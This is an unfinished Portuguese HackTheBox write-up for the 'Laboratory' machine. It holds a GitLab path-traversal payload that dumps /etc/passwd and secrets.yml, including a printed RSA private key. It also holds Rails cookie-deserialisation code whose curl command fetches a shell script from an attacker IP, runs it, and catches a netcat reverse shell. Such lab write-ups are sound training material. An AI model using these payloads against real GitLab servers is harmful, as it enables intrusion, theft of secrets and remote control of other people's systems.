<html>
 <body>
  <script src="https://www.hackthebox.eu/badge/148108"></script>
 </body>
 </html>


Back to all write-ups: [here](https://repo4chu.github.io/hackthebox/)


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Laboratory - HackTheBox - WriteUp
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
![image](https://i.imgur.com/Yy18N58.png)

**Tools** utilizadas:
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
nmap
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~



~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 25:ba:64:8f:79:9d:5d:95:97:2c:1b:b2:5e:9b:55:0d (RSA)
|   256 28:00:89:05:55:f9:a2:ea:3c:7d:70:ea:4d:ea:60:0f (ECDSA)
|_  256 77:20:ff:e9:46:c0:68:92:1a:0b:21:29:d1:53:aa:87 (ED25519)
80/tcp  open  http     Apache httpd 2.4.41
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Did not follow redirect to https://laboratory.htb/
443/tcp open  ssl/http Apache httpd 2.4.41 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: The Laboratory
| ssl-cert: Subject: commonName=laboratory.htb
| Subject Alternative Name: DNS:git.laboratory.htb
| Issuer: commonName=laboratory.htb
| Public Key type: rsa
| Public Key bits: 4096
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2020-07-05T10:39:28
| Not valid after:  2024-03-03T10:39:28
| MD5:   2873 91a5 5022 f323 4b95 df98 b61a eb6c
|_SHA-1: 0875 3a7e eef6 8f50 0349 510d 9fbf abc3 c70a a1ca
| tls-alpn: 
|_  http/1.1
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Podemos perceber dois sites:
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
https://laboratory.htb/
https://git.laboratory.htb/
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Ao acessar o site https://git.laboratory.htb/ nos deparamos com um [GitLab](https://about.gitlab.com/).

Em seguida, vamos tentar nos cadastrar:
![Image](https://i.imgur.com/ZBrnqIP.png)

Após o cadastro ser bem sucedido, temos acesso ao painel do GitLab, portanto, vamos tententar identificar a versão utilizada.

Na página https://git.laboratory.htb/help podemos identificar a versão exata que está sendo utilizada:
![Image](https://i.imgur.com/Jf44fiC.png)


Após encontrar a versão, podemos fazer buscas por exploits e falhas já conhecidas da versão...

Um [report](https://hackerone.com/reports/827052) do site de bugbounty HackerOne é nosso ponto inicial.

Portanto, devemos primeiramente criar dois projetos:

Vou chamar um de 'chu' e outro de 'stevenseagal' (XD)

Projeto 1 - chu:
![Image](https://i.imgur.com/xX8oTlp.png)

Projeto 2 - stevenseagal: 
![Image](https://i.imgur.com/EtNLpZ9.png)

Podemos conferir os dois projetos criados:
![Image](https://i.imgur.com/ntSr8u1.png)

Depois de criarmos os dois projetos, vamos tentar simular o que foi feito no report do H1.

Primeiro passo criar um novo Issue no projeto 'chu'
![Image](https://i.imgur.com/xMcW43V.png)

Dentro do issue iremos usar o mesmo payload do report
![Image](https://i.imgur.com/xMcW43V.png)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
![a](/uploads/11111111111111111111111111111111/../../../../../../../../../../../../../../etc/passwd)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Logo em seguida, vamos mover o Issue para o outro projeto. (em meu caso do projeto chu para stevenseagal)
![Image](https://i.imgur.com/9r5mEnz.png)

Ao mover, dentro do projeto 2(stevenseagal) podemos perceber que ele já renomeou o arquivo em anexo chamado 'a' para o arquivo que queriamos (/etc/passwd)
![Image](https://i.imgur.com/OND9zlB.png)

Ao abrir o arquivo, temos o conteúdo:
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
_apt:x:104:65534::/nonexistent:/bin/false
sshd:x:105:65534::/var/run/sshd:/usr/sbin/nologin
git:x:998:998::/var/opt/gitlab:/bin/sh
gitlab-www:x:999:999::/var/opt/gitlab/nginx:/bin/false
gitlab-redis:x:997:997::/var/opt/gitlab/redis:/bin/false
gitlab-psql:x:996:996::/var/opt/gitlab/postgresql:/bin/sh
mattermost:x:994:994::/var/opt/gitlab/mattermost:/bin/sh
registry:x:993:993::/var/opt/gitlab/registry:/bin/sh
gitlab-prometheus:x:992:992::/var/opt/gitlab/prometheus:/bin/sh
gitlab-consul:x:991:991::/var/opt/gitlab/consul:/bin/sh
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Agora que já conseguimos ler arquivos dentro do servidor, podemos procurar por arquivos sensiveis que nos auxiliaram na exploração...
Um deles é o [secrets.yml](https://docs.gitlab.com/ee/development/application_secrets.html)

Portanto, repetimos o mesmo passo que fizemos para ler o /etc/passwd.

![Image](https://i.imgur.com/IleNsTZ.png)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
![a](/uploads/11111111111111111111111111111111/../../../../../../../../../../../../../../opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Ao mover para o projeto 2, temos o arquivo secrets.yml
![Image](https://i.imgur.com/1G0jbn2.png)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
# This file is managed by gitlab-ctl. Manual changes will be
# erased! To change the contents below, edit /etc/gitlab/gitlab.rb
# and run `sudo gitlab-ctl reconfigure`.

---
production:
  db_key_base: 627773a77f567a5853a5c6652018f3f6e41d04aa53ed1e0df33c66b04ef0c38b88f402e0e73ba7676e93f1e54e425f74d59528fb35b170a1b9d5ce620bc11838
  secret_key_base: 3231f54b33e0c1ce998113c083528460153b19542a70173b4458a21e845ffa33cc45ca7486fc8ebb6b2727cc02feea4c3adbe2cc7b65003510e4031e164137b3
  otp_key_base: db3432d6fa4c43e68bf7024f3c92fea4eeea1f6be1e6ebd6bb6e40e930f0933068810311dc9f0ec78196faa69e0aac01171d62f4e225d61e0b84263903fd06af
  openid_connect_signing_key: |
    -----BEGIN RSA PRIVATE KEY-----
    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
    -----END RSA PRIVATE KEY-----
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Podemos ver que o report inicial era sobre poder ler arquivos, mas lendo mais a seguir, podemos ver que é escalado para um RCE usando o gitlab-console.

Para isso, devemos instalar o GitLab, vamos usar o curl para isso:
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
curl -s https://packages.gitlab.com/install/repositories/gitlab/gitlab-ce/script.deb.sh | sudo bash
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Após a instalação, vamos reconfigurar o GitLab:
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
gitlab-ctl reconfigure
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Editar o arquivo de configuração com a secret_key_base que obtemos do nosso alvo, podemos apenas comentar a linha antiga e adicionar uma nova:
![Image](https://i.imgur.com/kI3d5jn.png)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
nano /opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Após adicionarmos a secret_key_base ao nosso arquivo, vamos executar o console do rails.

gitlab-rails console

![Image](https://i.imgur.com/w77UbcU.png)

Agora vamos usar o payload do H1 e fazer algumas mudanças, adicionamos o comando: 'curl -s 10.10.14.219:1/chu.sh -o /tmp/chu.sh && chmod 777 /tmp/chu.sh'
Sendo assim, fazendo o download da nossa shell e salvando ela no diretório /tmp e adicionando permissão.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
request = ActionDispatch::Request.new(Rails.application.env_config)
request.env["action_dispatch.cookies_serializer"] = :marshal
cookies = request.cookie_jar

erb = ERB.new("<%= `curl -s 10.10.14.219:1/chu.sh -o /tmp/chu.sh && chmod 777 /tmp/chu.sh` %>")
depr = ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.new(erb, :result, "@result", ActiveSupport::Deprecation.new)
cookies.signed[:cookie] = depr
puts cookies[:cookie]
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Após esse comando, teremos na saída dele um cookie:
![Image](https://i.imgur.com/bq5al2V.png)

Agora vamos envia-lo para nosso alvo
![Image](https://i.imgur.com/UPPGHoE.png)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
curl -k -vvv 'https://git.laboratory.htb/users/sign_in' -b "experimentation_subject_id=BAhvOkBBY3RpdmVTdXBwb3J0OjpEZXByZWNhdGlvbjo6RGVwcmVjYXRlZEluc3RhbmNlVmFyaWFibGVQcm94eQk6DkBpbnN0YW5jZW86CEVSQgs6EEBzYWZlX2xldmVsMDoJQHNyY0kiAYIjY29kaW5nOlVURi04Cl9lcmJvdXQgPSArJyc7IF9lcmJvdXQuPDwoKCBgY3VybCAtcyAxMC4xMC4xNC4yMTk6MS9jaHUuc2ggLW8gL3RtcC9jaHUuc2ggJiYgY2htb2QgNzc3IC90bXAvY2h1LnNoYCApLnRvX3MpOyBfZXJib3V0BjoGRUY6DkBlbmNvZGluZ0l1Og1FbmNvZGluZwpVVEYtOAY7CkY6E0Bmcm96ZW5fc3RyaW5nMDoOQGZpbGVuYW1lMDoMQGxpbmVub2kAOgxAbWV0aG9kOgtyZXN1bHQ6CUB2YXJJIgxAcmVzdWx0BjsKVDoQQGRlcHJlY2F0b3JJdTofQWN0aXZlU3VwcG9ydDo6RGVwcmVjYXRpb24ABjsKVA==--f4d90880783a7e9690a1708f3b37c665adf38322"
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Ao enviar a requisição, podemos perceber que nosso payload funcionou e ele fez o download de nosso arquivo:

![Image](https://i.imgur.com/e8zztVj.png)


Agora nos falta executar nosso arquivo, para isso faremos o mesmo passo a cima, enviaremos um cookie com o comando: 'bash /tmp/chu.sh'
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
request = ActionDispatch::Request.new(Rails.application.env_config)
request.env["action_dispatch.cookies_serializer"] = :marshal
cookies = request.cookie_jar

erb = ERB.new("<%= `bash /tmp/chu.sh` %>")
depr = ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.new(erb, :result, "@result", ActiveSupport::Deprecation.new)
cookies.signed[:cookie] = depr
puts cookies[:cookie]
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Com isso temos o cookie para ser enviado:
![Image](https://i.imgur.com/em2dby2.png)

Agora basta enviarmos o payload que ira executar nossa shell (/tmp/chu.sh)
![image](https://i.imgur.com/Dsh53ne.png)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
curl -k -vvv 'https://git.laboratory.htb/users/sign_in' -b "experimentation_subject_id=BAhvOkBBY3RpdmVTdXBwb3J0OjpEZXByZWNhdGlvbjo6RGVwcmVjYXRlZEluc3RhbmNlVmFyaWFibGVQcm94eQk6DkBpbnN0YW5jZW86CEVSQgs6EEBzYWZlX2xldmVsMDoJQHNyY0kiUiNjb2Rpbmc6VVRGLTgKX2VyYm91dCA9ICsnJzsgX2VyYm91dC48PCgoIGBiYXNoIC90bXAvY2h1LnNoYCApLnRvX3MpOyBfZXJib3V0BjoGRUY6DkBlbmNvZGluZ0l1Og1FbmNvZGluZwpVVEYtOAY7CkY6E0Bmcm96ZW5fc3RyaW5nMDoOQGZpbGVuYW1lMDoMQGxpbmVub2kAOgxAbWV0aG9kOgtyZXN1bHQ6CUB2YXJJIgxAcmVzdWx0BjsKVDoQQGRlcHJlY2F0b3JJdTofQWN0aXZlU3VwcG9ydDo6RGVwcmVjYXRpb24ABjsKVA==--68cfa7b052d7fb23908e3bc99f75a3ee154e5d0a"
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

E estamos dentro!

![Image](https://i.imgur.com/eweizzM.png)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
nc -vvnlp 1337
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

to escrevendo guenta aew


if i helped you, add + respect at my profile :D
<html>
 <body>
  <script src="https://www.hackthebox.eu/badge/148108"></script>
 </body>
 </html>


My references:
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
https://hackerone.com/reports/827052
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
